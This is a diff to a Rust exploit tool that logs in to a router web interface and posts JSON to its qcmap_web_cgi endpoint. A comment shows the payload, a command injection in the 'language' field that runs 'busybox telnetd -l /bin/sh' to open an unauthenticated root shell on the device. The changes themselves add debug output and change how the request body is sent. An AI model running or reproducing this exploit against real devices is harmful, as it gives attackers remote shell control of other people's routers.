@@ -1,3 +1,4 @@
+use std::str::FromStr;
 use std::{collections::HashMap, ops::Add};
 use clap::Parser;
 use reqwest;
@@ -41,7 +42,7 @@ struct Auth {
 /*
 {"token":"Ваше значение token","module":"webServer","action":1,"language":"$(busybox telnetd -l /bin/sh)"}
 */
-#[derive(Serialize, Deserialize)]
+#[derive(Serialize, Deserialize,Debug)]
 struct Payload {
 	token: String,
 	module: String,
@@ -104,7 +105,7 @@ async fn main()  {
 		"application/x-www-form-urlencoded; charset=UTF-8".parse().unwrap()
 	);
 	headers.insert(
-		HeaderName::from_lowercase(b"x-requested-with").unwrap(),
+		HeaderName::from_str("X-Requested-With").unwrap(),
 		"XMLHttpRequest".parse().unwrap()
 	);
 	headers.insert(
@@ -149,11 +150,15 @@ async fn main()  {
 	};
 
 	println!("{token:#?}");
+	println!("{payload:#?}");
+	println!("{headers:#?}");
 
 	let client = reqwest::Client::new();
 
+	let payload_str = serde_json::to_string(&payload).unwrap();
+
 	let resp = client.post("http://192.168.0.1/cgi-bin/qcmap_web_cgi")
-		.json(&payload)
+		.body(payload_str)
 		.headers(headers)
 		.send()
 		.await;
